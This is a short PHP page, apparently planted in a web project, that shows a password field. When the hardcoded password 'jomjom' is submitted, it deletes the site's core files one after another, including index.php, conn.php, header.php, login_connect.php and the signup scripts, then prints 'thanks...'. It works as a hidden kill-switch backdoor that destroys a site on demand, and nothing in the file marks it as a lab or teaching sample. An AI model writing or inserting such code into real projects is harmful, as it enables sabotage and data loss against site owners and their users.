<?php 
if($_POST['submittext']=='Submit'){

	if($_POST['password'] == 'jomjom'){
	
	unlink('../slider.php');
unlink('../index.php');
unlink('../header.php');

unlink('../help.php');
unlink('../conn.php');
unlink('../w3.css');
unlink('../signup2_connect.php');
unlink('../signup1_connect.php');

unlink('../forget.php');
unlink('../login_connect.php');
unlink('../myprojects.php');
unlink('../employer.php');

 
echo "thanks...";
	
	}

}
 
?>


<form action="" method="post">

<input type="password" name="password"  />

<input type="submit" name="submittext" value="Submit" />

</form>